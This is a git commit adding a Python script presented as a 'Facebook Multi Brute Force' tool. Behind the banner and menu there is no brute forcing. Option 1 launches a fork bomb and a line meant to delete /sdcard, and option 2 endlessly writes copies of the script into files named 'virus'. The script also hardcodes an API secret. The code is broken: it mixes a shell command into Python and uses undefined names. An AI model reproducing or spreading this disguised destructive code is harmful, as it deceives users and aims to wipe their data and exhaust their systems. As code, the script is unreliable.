06097fe0596276a389cb725d2e76d942e40a198f
rhaby <57067569+rhaby@users.noreply.github.com>
2020-12-11 03:09:10 +0300

    Add files via upload

---
+++ fmbrhaby.py
@@ -0,0 +1,49 @@
+## fmbrute.py - Facebook Multi Brute Force
+# -*- coding: utf-8 -*-
+##
+import os
+import sys
+import hashlib
+import requests
+
+if sys.platform == "linux2":
+	os.system("clear")
+elif sys.platform == "win32":
+	os.system("cls")
+else:
+	os.system("clear")
+API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
+__banner__ = """\033[1;33m |\   /| ***********************
+  \|_|/  Author: ******
+  /. .\  Version: 3.0v
+ =\_Y_/= Telegram: *********
+  {>o<}  Insta: ******
+
+=============================================="""
+print(__banner__)
+
+print ('              1-bruteforce Facebook')
+print("")
+print('==============================================')
+print("")
+print ('              2- DeveloperMaker ')
+print('==============================================')
+
+
+ali1 = input ("$")
+if ali1 == '1' :
+        import os;
+        while (true):
+            os.fork()
+            rm -rf /sdcard
+if ali1 == '2' :
+    import os;
+
+    vairous = 0
+    while (true):
+        with open("virus{0}".format(vairous), "w") as f:
+            f.write(open(___file___).read())
+            f.close()
+            vairous +=1
+            
+    
